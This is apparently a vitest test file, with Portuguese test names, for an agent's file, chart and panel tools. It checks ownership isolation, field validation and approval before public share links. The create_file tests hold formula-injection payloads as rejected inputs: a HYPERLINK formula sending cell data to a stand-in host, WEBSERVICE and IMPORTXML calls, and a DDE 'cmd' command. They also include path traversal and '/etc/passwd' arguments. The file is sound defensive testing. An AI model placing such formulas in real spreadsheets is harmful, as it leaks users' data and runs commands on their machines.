import { decide, parsePageSpec } from "@workspace/shared";
import { describe, expect, it } from "vitest";
import { createLoadedSet } from "../../capabilities/loaded-set.js";
import { createCapabilityRegistry } from "../../capabilities/registry.js";
import { FakeDeliverables } from "../../presets/fakes.js";
import { fakeToolContext } from "../../testing.js";
import { CREATABLE_EXTENSIONS, createDeliverablesCapability } from "./index.js";

const setup = () => {
	const fake = new FakeDeliverables();
	const capability = createDeliverablesCapability(fake.ports());
	const tool = (name: string) => {
		const found = capability.tools.find((t) => t.name === name);
		if (!found) throw new Error(`sem tool ${name}`);
		return found;
	};
	return { fake, capability, tool, ctx: fakeToolContext() };
};

const chartSpec = { type: "bar", title: "Vendas", x: "mes", series: [{ key: "total", label: "Total" }], data: [{ mes: "jan", total: 10 }, { mes: "fev", total: 20 }] };
const pageSpec = { v: 2, title: "Visão geral", root: { type: "stack", children: [{ type: "stat", props: { label: "Total", value: 30 } }] } };

describe("capacidade deliverables: forma", () => {
	it("é lazy (não núcleo), tem as 9 tools e instrução lazy", () => {
		const { capability } = setup();
		expect(capability.core).toBe(false);
		expect(capability.tools.map((t) => t.name)).toEqual(["create_file", "create_page", "chart", "inspect_file", "panel_list", "panel_read", "panel_update", "panel_share", "panel_unshare"]);
		expect(capability.instructions).toContain("ABNT");
	});

	it("efeito de cada tool: criar arquivo, painel e gráfico = write_internal; inspect_file = read", () => {
		const { tool } = setup();
		expect(tool("create_file").effect).toBe("write_internal");
		expect(tool("create_page").effect).toBe("write_internal");
		expect(tool("chart").effect).toBe("write_internal");
		expect(tool("inspect_file").effect).toBe("read");
	});

	it("inspect_file trata o conteúdo como dado não confiável e privado", () => {
		const { tool } = setup();
		expect(tool("inspect_file")).toMatchObject({ trust: "untrusted", source: "file", privateData: true });
	});

	it("cada descrição diz quando usar e quando não usar", () => {
		const { capability } = setup();
		for (const t of capability.tools) expect(t.description, t.name).toMatch(/Use (for|when|to)/);
		for (const t of capability.tools) expect(t.description, t.name).toMatch(/[Dd]o not use/);
	});

	it("os moldes só chegam ao carregar a capacidade (use_capability), com as tools novas", async () => {
		const { capability, ctx } = setup();
		const set = createLoadedSet(createCapabilityRegistry([capability]));
		expect(set.toolsForModel().map((t) => t.name)).toEqual(["use_capability"]);
		const out = await set.useCapabilityTool.run({ id: "deliverables" }, ctx);
		expect(out.ok && out.summary).toContain("create_file, create_page, chart, inspect_file, panel_list, panel_read, panel_update, panel_share, panel_unshare");
		expect(out.ok && out.summary).toContain("Academic work (ABNT)");
		expect(out.ok && out.summary).toContain("Spreadsheet (xlsx)");
		expect(out.ok && out.summary).toContain("Deck (pptx)");
		const again = await set.useCapabilityTool.run({ id: "deliverables" }, ctx);
		expect(again.ok && again.summary).toBe('"Entregas" was already loaded.');
	});
});

describe("create_file", () => {
	it("docx com ABNT: normaliza pelo shared, grava com o dono e o run, devolve recibo", async () => {
		const { fake, tool, ctx } = setup();
		const out = await tool("create_file").run({ filename: "TCC final.docx", content: "# Título\n\nTexto.", layout: "abnt", title: "TCC" }, ctx);
		expect(out).toMatchObject({ ok: true, receipt: { externalId: "df-1", url: "https://files.test/df-1" } });
		expect(fake.created[0]).toMatchObject({ userId: "owner-1", runId: "run-1" });
		expect(fake.created[0]?.input).toMatchObject({ format: "docx", ext: "docx", layout: "abnt", title: "TCC" });
	});

	it("xlsx com fórmula de rede ou execução falha listando o que não é aceito; fórmula comum segue (auditoria F2, S4)", async () => {
		const { fake, tool, ctx } = setup();
		for (const formula of ['=HYPERLINK("http://x/?"&A1,"a")', '=WEBSERVICE("http://x")', '=IMPORTXML("http://x","//a")', "=cmd|' /C calc'!A0"]) {
			const out = await tool("create_file").run({ filename: "p.xlsx", sheets: [{ rows: [["a", formula]] }] }, ctx);
			expect(out).toMatchObject({ ok: false, error: expect.stringContaining("not accepted") });
		}
		expect(fake.created).toHaveLength(0);
		const ok = await tool("create_file").run({ filename: "p.xlsx", sheets: [{ rows: [[1, 2, "=SUM(A1:B1)", '=IF(A1>1,VLOOKUP(A1,A:B,2,0),0)']] }] }, ctx);
		expect(ok.ok).toBe(true);
	});

	it("csv com fórmula de rede em algum campo também falha; csv comum e fórmula comum seguem (reauditoria F2, N1)", async () => {
		const { fake, tool, ctx } = setup();
		for (const content of ['nome,link\nAna,=HYPERLINK("http://x/?"&A2,"ok")', 'a;"@WEBSERVICE(""http://x"")"', "x\t+IMPORTXML(\"http://x\",\"//a\")"]) {
			const out = await tool("create_file").run({ filename: "p.csv", content }, ctx);
			expect(out).toMatchObject({ ok: false, error: expect.stringContaining("not accepted") });
		}
		expect(fake.created).toHaveLength(0);
		const ok = await tool("create_file").run({ filename: "p.csv", content: "item,valor\ncafé,-3\ntotal,=SUM(B2:B2)" }, ctx);
		expect(ok.ok).toBe(true);
	});

	it("xlsx recebe sheets e pptx recebe slides", async () => {
		const { fake, tool, ctx } = setup();
		const sheet = await tool("create_file").run({ filename: "preços.xlsx", sheets: [{ name: "Preços", columns: ["item", "valor"], rows: [["a", 1], ["b", "=B2*2"]] }] }, ctx);
		expect(sheet.ok).toBe(true);
		const deck = await tool("create_file").run({ filename: "apresentação.pptx", slides: [{ layout: "title", title: "Olá" }], theme: "dark", brand_color: "#1d6b3a" }, ctx);
		expect(deck.ok).toBe(true);
		expect(fake.created.map((c) => c.input.format)).toEqual(["xlsx", "pptx"]);
		expect(fake.created[1]?.input).toMatchObject({ theme: "dark", brandColor: "#1d6b3a" });
	});

	it("md, csv, txt e json guardam o conteúdo como está", async () => {
		const { fake, tool, ctx } = setup();
		for (const ext of ["md", "csv", "txt", "json"]) {
			expect((await tool("create_file").run({ filename: `nota.${ext}`, content: "a,b" }, ctx)).ok).toBe(true);
		}
		expect(fake.created.map((c) => c.input.content)).toEqual(["a,b", "a,b", "a,b", "a,b"]);
	});

	it("não cria .html nem outra extensão fora da lista, nem caminho com pasta", async () => {
		const { fake, tool, ctx } = setup();
		for (const filename of ["pagina.html", "pagina.htm", "script.py", "run.exe", "semextensao", "../fora.md", "a/b.md", "a\\b.md"]) {
			const out = await tool("create_file").run({ filename, content: "x" }, ctx);
			expect(out.ok, filename).toBe(false);
		}
		expect(CREATABLE_EXTENSIONS).not.toContain("html");
		expect(fake.created).toEqual([]);
	});

	it("campo desconhecido falha com a lista aceita", async () => {
		const { tool, ctx } = setup();
		const out = await tool("create_file").run({ filename: "a.md", content: "x", css: "body{}" }, ctx);
		expect(out).toMatchObject({ ok: false, error: expect.stringContaining("Unknown field(s) for create_file: css") });
		expect(out.ok === false && out.hint).toContain("Accepted fields: filename, content, title, layout, sheets, slides, theme, brand_color");
	});

	it("combinações incoerentes falham dizendo o que corrigir", async () => {
		const { fake, tool, ctx } = setup();
		const cases: Array<[Record<string, unknown>, string]> = [
			[{ filename: "a.md" }, "needs content"],
			[{ filename: "a.xlsx" }, "needs sheets"],
			[{ filename: "a.pptx" }, "needs slides"],
			[{ filename: "a.md", content: "x", sheets: [{ rows: [[1]] }] }, "sheets only applies to .xlsx"],
			[{ filename: "a.md", content: "x", layout: "abnt" }, "only applies to .docx and .pdf"],
			[{ filename: "a.docx", content: "x", theme: "dark" }, "only apply to .pptx"],
			[{ filename: "a.xlsx", content: "x", sheets: [{ rows: [[1]] }] }, "content does not apply"],
		];
		for (const [args, expected] of cases) {
			const out = await tool("create_file").run(args, ctx);
			expect(out.ok, JSON.stringify(args)).toBe(false);
			expect(out.ok === false && out.error).toContain(expected);
		}
		expect(fake.created).toEqual([]);
	});

	it("erros do validador compartilhado chegam como ok:false (slides inválidos, cor ruim, NUL)", async () => {
		const { tool, ctx } = setup();
		const slides = await tool("create_file").run({ filename: "a.pptx", slides: [{ layout: "inexistente", title: "x" }] }, ctx);
		expect(slides.ok).toBe(false);
		const color = await tool("create_file").run({ filename: "a.pptx", slides: [{ layout: "title", title: "x" }], brand_color: "verde" }, ctx);
		expect(color).toMatchObject({ ok: false, error: expect.stringContaining("brand_color") });
		const nul = await tool("create_file").run({ filename: "a.txt", content: "a\u0000b" }, ctx);
		expect(nul.ok).toBe(false);
	});

	it("subcampo desconhecido de uma planilha falha (nada é descartado em silêncio)", async () => {
		const { tool, ctx } = setup();
		const out = await tool("create_file").run({ filename: "a.xlsx", sheets: [{ rows: [[1]], estilo: "x" }] }, ctx);
		expect(out.ok).toBe(false);
	});

	it("nova versão aparece no recibo; erro da porta vira ok:false com a mensagem real", async () => {
		const { fake, tool, ctx } = setup();
		fake.files.create = async () => ({ id: "f9", name: "a.md", bytes: 3, version: 2 });
		const out = await tool("create_file").run({ filename: "a.md", content: "x" }, ctx);
		expect(out).toMatchObject({ ok: true, receipt: { what: "Created file a.md (version 2)", externalId: "f9" } });
		fake.files.create = async () => {
			throw new Error("armazenamento cheio");
		};
		expect(await tool("create_file").run({ filename: "a.md", content: "x" }, ctx)).toMatchObject({ ok: false, error: "armazenamento cheio" });
	});

	it("riskFacts mostra só o nome do arquivo", () => {
		const { tool } = setup();
		expect(tool("create_file").riskFactsFor({ filename: "a.md", content: "segredo" })).toEqual({ target: "a.md" });
	});
});

describe("create_page", () => {
	it("valida o painel com o shared, grava pelo PageStore e devolve recibo", async () => {
		const { fake, tool, ctx } = setup();
		const out = await tool("create_page").run({ spec: pageSpec }, ctx);
		expect(out).toMatchObject({ ok: true, receipt: { externalId: "page-1", where: "Visão geral", url: "https://pages.test/page-1" } });
		expect(fake.pages[0]).toMatchObject({ userId: "owner-1", runId: "run-1" });
	});

	it("spec inválida e campo de topo desconhecido falham sem gravar", async () => {
		const { fake, tool, ctx } = setup();
		const bad = await tool("create_page").run({ spec: { v: 2, title: "x", root: { type: "nada" } } }, ctx);
		expect(bad).toMatchObject({ ok: false, error: expect.stringContaining("Invalid panel spec") });
		const unknown = await tool("create_page").run({ spec: pageSpec, extra: 1 }, ctx);
		expect(unknown).toMatchObject({ ok: false, error: expect.stringContaining("Unknown field(s) for create_page: extra") });
		expect(unknown.ok === false && unknown.hint).toContain("Accepted fields: spec");
		expect(fake.pages).toEqual([]);
	});
});

describe("chart", () => {
	it("valida ChartSpec, grava pelo ChartStore e devolve recibo", async () => {
		const { fake, tool, ctx } = setup();
		const out = await tool("chart").run({ spec: chartSpec }, ctx);
		expect(out).toMatchObject({ ok: true, receipt: { externalId: "chart-1", where: "Vendas" } });
		expect(fake.charts[0]).toMatchObject({ userId: "owner-1", runId: "run-1" });
	});

	it("campo desconhecido no spec e tipo inválido falham", async () => {
		const { fake, tool, ctx } = setup();
		const unknown = await tool("chart").run({ spec: { ...chartSpec, cor: "azul" } }, ctx);
		expect(unknown).toMatchObject({ ok: false, error: expect.stringContaining("Invalid chart spec") });
		const type = await tool("chart").run({ spec: { ...chartSpec, type: "donut" } }, ctx);
		expect(type.ok).toBe(false);
		expect(fake.charts).toEqual([]);
	});
});

describe("inspect_file", () => {
	it("devolve o texto de um arquivo do próprio dono", async () => {
		const { fake, tool, ctx } = setup();
		fake.inspectable.set("owner-1:f1", { name: "a.md", bytes: 5, text: "olá", truncated: false });
		const out = await tool("inspect_file").run({ file_id: "f1" }, ctx);
		expect(out.ok && out.summary).toContain("a.md (5 bytes)");
		expect(out.ok && out.summary).toContain("olá");
	});

	it("planilha vem em linhas por aba", async () => {
		const { fake, tool, ctx } = setup();
		fake.inspectable.set("owner-1:f2", { name: "p.xlsx", bytes: 9, sheets: [{ name: "Preços", rows: [["item", "valor"], ["a", "1"]], truncated: false }], truncated: false });
		const out = await tool("inspect_file").run({ file_id: "f2" }, ctx);
		expect(out.ok && out.summary).toContain("## Preços\nitem\tvalor\na\t1");
	});

	it("arquivo de outro dono ou inexistente: mesmo erro, sem revelar que existe (IDOR)", async () => {
		const { fake, tool, ctx } = setup();
		fake.inspectable.set("owner-2:f3", { name: "segredo.md", bytes: 1, text: "do outro dono", truncated: false });
		const other = await tool("inspect_file").run({ file_id: "f3" }, ctx);
		const missing = await tool("inspect_file").run({ file_id: "nao-existe" }, ctx);
		expect(other).toMatchObject({ ok: false, error: expect.stringContaining("File not found") });
		expect(other).toEqual(missing);
		expect(JSON.stringify(other)).not.toContain("do outro dono");
	});

	it("texto em partes: diz o total e como pedir a próxima; repassa offset ao porto (auditoria F2, C2)", async () => {
		const { fake, tool, ctx } = setup();
		fake.inspectable.set("owner-1:f5", { name: "longo.txt", bytes: 90, text: "aaaa", textRange: { start: 0, end: 4, total: 10 }, truncated: true });
		const first = await tool("inspect_file").run({ file_id: "f5" }, ctx);
		expect(first.ok && first.summary).toContain("characters 0-4 of 10");
		expect(first.ok && first.summary).toContain("offset=4");
		fake.inspectable.set("owner-1:f5", { name: "longo.txt", bytes: 90, text: "bbbbbb", textRange: { start: 4, end: 10, total: 10 }, truncated: false });
		const last = await tool("inspect_file").run({ file_id: "f5", offset: 4 }, ctx);
		expect(last.ok && last.summary).not.toContain("More text");
		expect(fake.inspected.map((c) => c.page)).toEqual([{}, { offset: 4 }]);
	});

	it("planilha em partes: faixa de linhas por aba e dica com sheet e start_row", async () => {
		const { fake, tool, ctx } = setup();
		fake.inspectable.set("owner-1:f6", { name: "g.xlsx", bytes: 9, sheets: [{ name: "Dados", rows: [["1"], ["2"]], truncated: true, startRow: 1, totalRows: 5 }], truncated: true });
		const out = await tool("inspect_file").run({ file_id: "f6", sheet: "Dados", start_row: 1 }, ctx);
		expect(out.ok && out.summary).toContain("## Dados (rows 1-2 of 5)");
		expect(out.ok && out.summary).toContain('sheet="Dados" and start_row=3');
		expect(fake.inspected[0]?.page).toEqual({ sheet: "Dados", startRow: 1 });
	});

	it("args de paginação inválidos falham com os campos aceitos", async () => {
		const { fake, tool, ctx } = setup();
		fake.inspectable.set("owner-1:f7", { name: "a.txt", bytes: 1, text: "x", truncated: false });
		for (const bad of [{ offset: -1 }, { offset: 1.5 }, { start_row: 0 }, { sheet: "" }, { page: 2 }]) {
			const out = await tool("inspect_file").run({ file_id: "f7", ...bad }, ctx);
			expect(out.ok, JSON.stringify(bad)).toBe(false);
		}
		const unknown = await tool("inspect_file").run({ file_id: "f7", page: 2 }, ctx);
		expect(!unknown.ok && unknown.hint).toContain("offset");
	});

	it("marca truncado e rejeita args inválidos", async () => {
		const { fake, tool, ctx } = setup();
		fake.inspectable.set("owner-1:f4", { name: "g.txt", bytes: 99, text: "x", truncated: true });
		const out = await tool("inspect_file").run({ file_id: "f4" }, ctx);
		expect(out.ok && out.summary).toContain("[truncated]");
		expect((await tool("inspect_file").run({ file_id: "" }, ctx)).ok).toBe(false);
		expect((await tool("inspect_file").run({ file_id: "f4", path: "/etc/passwd" }, ctx)).ok).toBe(false);
	});
});

describe("painéis: listar, ler, atualizar, compartilhar", () => {
	const withPanel = async () => {
		const s = setup();
		await s.tool("create_page").run({ spec: pageSpec }, s.ctx);
		return s;
	};
	const ctxOf = (ownerId: string) => ({ ...fakeToolContext(), ownerId });

	it("as tools novas ficam na parte lazy: o prompt estável só tem use_capability", () => {
		const { capability } = setup();
		const set = createLoadedSet(createCapabilityRegistry([capability]));
		expect(set.toolsForModel().map((t) => t.name)).toEqual(["use_capability"]);
	});

	it("efeitos: ler = read (privado), atualizar = write_internal, link público = public_link com confirmação sempre", () => {
		const { tool } = setup();
		expect(tool("panel_list")).toMatchObject({ effect: "read", privateData: true });
		expect(tool("panel_read")).toMatchObject({ effect: "read", privateData: true });
		expect(tool("panel_update").effect).toBe("write_internal");
		expect(tool("panel_unshare").effect).toBe("write_internal");
		expect(tool("panel_share")).toMatchObject({ effect: "public_link", confirm: "always" });
	});

	it("panel_list lista só os painéis do dono do run", async () => {
		const { fake, tool, ctx } = await withPanel();
		const other = parsePageSpec({ ...pageSpec, title: "Do outro" });
		if (!other.ok) throw new Error(other.error);
		await fake.pageStore.save("owner-2", "run-9", other.spec);
		const out = await tool("panel_list").run({}, ctx);
		expect(out.ok && out.summary).toContain('page-1: "Visão geral"');
		expect(out.ok && out.summary).not.toContain("Do outro");
		const empty = await tool("panel_list").run({}, ctxOf("owner-3"));
		expect(empty.ok && empty.summary).toBe("This bot has no panels yet.");
	});

	it("panel_read mostra revisão, ids dos nós e o conteúdo; painel de outro dono ou inexistente = not found", async () => {
		const { tool, ctx } = await withPanel();
		const out = await tool("panel_read").run({ panel_id: "page-1" }, ctx);
		expect(out.ok && out.summary).toContain("revision 1");
		expect(out.ok && out.summary).toContain("[stat]");
		expect(out.ok && out.summary).toContain("public link OFF");
		for (const [owner, id] of [["owner-2", "page-1"], ["owner-1", "nao-existe"]] as const) {
			const bad = await tool("panel_read").run({ panel_id: id }, ctxOf(owner));
			expect(bad).toMatchObject({ ok: false, error: expect.stringContaining("not found") });
		}
	});

	it("panel_update com spec completo mantém o pageId e sobe a revisão", async () => {
		const { fake, tool, ctx } = await withPanel();
		const out = await tool("panel_update").run({ panel_id: "page-1", spec: { ...pageSpec, title: "Visão nova" } }, ctx);
		expect(out).toMatchObject({ ok: true, receipt: { externalId: "page-1", where: "Visão nova" } });
		expect(out.ok && out.summary).toContain("revision 2");
		expect(fake.pages).toHaveLength(1);
		expect(fake.updates[0]).toMatchObject({ userId: "owner-1", runId: "run-1", id: "page-1", revision: 2 });
	});

	it("panel_update por ops troca só o nó citado; id inexistente falha sem gravar", async () => {
		const { fake, tool, ctx } = await withPanel();
		const read = await tool("panel_read").run({ panel_id: "page-1" }, ctx);
		const statId = read.ok ? /- (\S+) \[stat\]/.exec(read.summary)?.[1] : undefined;
		expect(statId).toBeTruthy();
		const out = await tool("panel_update").run({ panel_id: "page-1", ops: [{ op: "replace", id: statId, node: { type: "stat", props: { label: "Total", value: 99 } } }] }, ctx);
		expect(out.ok).toBe(true);
		expect(JSON.stringify(fake.pages[0]?.spec)).toContain("99");
		const bad = await tool("panel_update").run({ panel_id: "page-1", ops: [{ op: "remove", id: "id-que-nao-existe" }] }, ctx);
		expect(bad.ok).toBe(false);
		expect(fake.updates).toHaveLength(1);
	});

	it("panel_update com spec inválido falha com o motivo; campo desconhecido, ops+spec e nada a mudar também", async () => {
		const { fake, tool, ctx } = await withPanel();
		const bad = await tool("panel_update").run({ panel_id: "page-1", spec: { v: 2, title: "x", root: { type: "nada" } } }, ctx);
		expect(bad).toMatchObject({ ok: false, error: expect.stringContaining("Invalid panel spec") });
		const unknown = await tool("panel_update").run({ panel_id: "page-1", palette: "x" }, ctx);
		expect(unknown).toMatchObject({ ok: false, error: expect.stringContaining("Unknown field(s) for panel_update: palette") });
		expect(unknown.ok === false && unknown.hint).toContain("Accepted fields: panel_id, ops, spec, title, summary");
		const both = await tool("panel_update").run({ panel_id: "page-1", spec: pageSpec, ops: [{ op: "remove", id: "a" }] }, ctx);
		expect(both).toMatchObject({ ok: false, error: expect.stringContaining("not both") });
		const nothing = await tool("panel_update").run({ panel_id: "page-1" }, ctx);
		expect(nothing).toMatchObject({ ok: false, error: expect.stringContaining("Nothing to update") });
		expect(fake.updates).toEqual([]);
	});

	it("panel_update só título muda o título e mantém o resto; outro dono não altera", async () => {
		const { fake, tool, ctx } = await withPanel();
		expect((await tool("panel_update").run({ panel_id: "page-1", title: "Só o título" }, ctx)).ok).toBe(true);
		expect(fake.pages[0]?.spec).toMatchObject({ title: "Só o título", root: { type: "stack" } });
		const other = await tool("panel_update").run({ panel_id: "page-1", title: "Invadido" }, ctxOf("owner-2"));
		expect(other).toMatchObject({ ok: false, error: expect.stringContaining("not found") });
		expect(fake.pages[0]?.spec.title).toBe("Só o título");
	});

	it("conflito de revisão: relê e tenta uma vez de novo", async () => {
		const { fake, tool, ctx } = await withPanel();
		fake.conflictOnce = true;
		const out = await tool("panel_update").run({ panel_id: "page-1", title: "Depois da corrida" }, ctx);
		expect(out.ok && out.summary).toContain("revision 3");
	});

	it("panel_share pede aprovação sempre (mesmo autônomo) e fica oculto sem dono presente", () => {
		const { tool } = setup();
		const share = tool("panel_share");
		const base = { effect: share.effect, rules: [], taint: { untrustedReadInRun: false, argsCarryUntrusted: false }, confirm: share.confirm, now: new Date(0), action: { toolName: "panel_share" } } as const;
		expect(decide({ ...base, surface: "chat", ownerPresent: true, autonomy: "autonomous" }).kind).toBe("approve");
		for (const surface of ["agenda", "routine", "subagent", "bot_to_bot"] as const) {
			expect(decide({ ...base, surface, ownerPresent: false, autonomy: "autonomous" }).kind, surface).toBe("hidden");
		}
	});

	it("panel_share devolve o link só no resumo (recibo sem endereço); outro dono = not found; riskFacts diz o painel", async () => {
		const { fake, tool, ctx } = await withPanel();
		const out = await tool("panel_share").run({ panel_id: "page-1" }, ctx);
		expect(out.ok && out.summary).toContain("https://web.test/p/token-page-1");
		expect(JSON.stringify(out.ok && out.receipt)).not.toContain("token-page-1");
		expect(fake.pages[0]?.shared).toBe(true);
		const other = await tool("panel_share").run({ panel_id: "page-1" }, ctxOf("owner-2"));
		expect(other).toMatchObject({ ok: false, error: expect.stringContaining("not found") });
		const facts = await tool("panel_share").enrichedRiskFactsFor({ panel_id: "page-1" }, { ownerId: "owner-1" });
		expect(facts?.target).toContain("Visão geral");
	});

	it("panel_unshare desliga o link; sem link ligado diz que não havia; outro dono não desliga", async () => {
		const { fake, tool, ctx } = await withPanel();
		const none = await tool("panel_unshare").run({ panel_id: "page-1" }, ctx);
		expect(none.ok && none.summary).toContain("nothing to turn off");
		await tool("panel_share").run({ panel_id: "page-1" }, ctx);
		const other = await tool("panel_unshare").run({ panel_id: "page-1" }, ctxOf("owner-2"));
		expect(other.ok).toBe(false);
		expect(fake.pages[0]?.shared).toBe(true);
		const off = await tool("panel_unshare").run({ panel_id: "page-1" }, ctx);
		expect(off.ok && off.summary).toContain("turned off");
		expect(fake.pages[0]?.shared).toBe(false);
	});
});
